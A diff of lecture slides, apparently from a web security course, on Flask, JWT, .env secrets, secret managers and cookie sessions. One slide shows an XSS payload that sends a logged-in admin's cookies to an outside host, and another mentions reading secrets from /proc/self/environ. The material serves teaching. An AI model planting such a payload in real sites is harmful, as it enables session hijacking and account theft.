@@ -22,8 +22,10 @@ date: 2023-02-24T02:57:21+10:00
 ## Lecture Review
 
 * Build a Flask app
-* Python semantics, `__name__`, `__main__`, `__dir__`
+* Python semantics
+  * `__name__`, `__main__`, `__dir__`
 * JWT
+  * Next slide!
 
 ---
 
@@ -33,6 +35,7 @@ date: 2023-02-24T02:57:21+10:00
 * What should be in a JWT token
 * Pros and Cons
 * Store secrets in a `.env`?
+  * Why `.env`?
 
 ---
 
@@ -40,29 +43,34 @@ date: 2023-02-24T02:57:21+10:00
 
 {{% section %}}
 
-More on this in later weeks
+> More on this in later weeks
 
 * `.env` + `.gitignore`
-* Scoped env command
+* Scoped environment
+* ... Why _not_ `.env`
 
 ---
 
-If it's in the environment, it's accessible to the entire process.  
-Even if you unset it in the code >:(
+If it's in the environment, the entire process can see it.. even if you unset it in the code* >:(
 
-* `/proc/self/environ`
+*: sometimes
+
+> `/proc/self/environ`
 
 {{% /section %}}
 
 ---
 
-> Alternatives
+> An alternative
 
-* External data sources (config servers)
+* External data sources
   * i.e. AWS Parameter Store
   * i.e. Google Secrets Manager
   * i.e. HashiCorp Vault
   * i.e. Apple KeyChain
+* Centralised management
+* Rotation + deployment at scale
+* Access control
 
 ---
 
@@ -72,8 +80,10 @@ jk the demo did work I was just dumb
 
 > 👉 Login as admin first 👈
 
-```
-<script>fetch("https://[...]/?v="+btoa(document.cookie))</script>aaa
+```js
+<script>
+  fetch("https://[...]/?v="+btoa(document.cookie))
+</script>aaa
 ```
 
 ---
@@ -92,6 +102,7 @@ jk the demo did work I was just dumb
 
 * Last week, auth via cookies
 * What does it mean to "log out"
+* Broken session management
 
 ---
 
